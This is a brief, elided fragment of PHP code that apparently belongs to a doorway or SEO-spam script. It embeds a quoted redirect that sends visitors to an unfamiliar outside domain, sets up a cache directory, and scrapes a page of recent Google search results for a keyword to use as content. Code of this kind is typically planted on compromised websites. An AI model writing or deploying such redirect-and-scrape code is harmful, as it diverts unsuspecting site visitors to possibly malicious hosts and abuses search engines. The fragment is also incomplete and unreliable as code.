...
{
	header("Location: http://flvziwjer.in/fors?d=$d");
exit;
}
';
$cachepath="./cache";
...
$pageparse=file_get_contents("https://www.google.com/search?q=".$keyforparse."&num=50&newwindow=1&source=lnt&tbs=qdr:d&sa=X");
